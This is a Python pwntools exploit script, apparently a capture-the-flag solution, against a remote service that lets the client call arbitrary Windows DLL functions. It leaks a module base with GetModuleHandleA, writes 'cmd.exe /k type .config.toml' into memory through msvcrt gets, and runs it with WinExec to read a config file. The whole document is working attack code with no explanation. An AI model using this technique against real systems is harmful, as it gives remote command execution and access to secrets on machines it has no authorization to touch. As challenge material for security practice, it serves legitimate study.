from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

io = remote(HOST, int(PORT))
# io.interactive()
io.recvuntil(b'load?')
io.sendline(b'kernel32')
io.recvuntil(b'call?')
io.sendline(b'GetModuleHandleA')
io.recvuntil(b'argument?')
io.sendline(b'0')
io.recvuntil(b'Result: ')
res = int(io.recvline(), 16)
print(f"Base at 0x{res:x}")
stri = res + 0x14e00

# io.recvuntil(b'load?')
io.sendline(b'msvcrt')
# io.recvuntil(b'call?')
io.sendline(b'gets')
# io.recvuntil(b'argument?')
io.sendline(b'%d' % stri)
io.sendline(b'cmd.exe /k type .config.toml')


# print(io.recvuntil(b'load?'))
io.sendline(b'kernel32')
# io.recvuntil(b'call?')
io.sendline(b'WinExec')
# io.recvuntil(b'argument?')
io.sendline(b'%d' % stri)
# io.sendline(b'echo cool')
# io.sendline(b'type .config.toml')
# io.sendline(b'type .config.toml')
print(io.recvall(timeout=1).split(b'WinExec')[1])

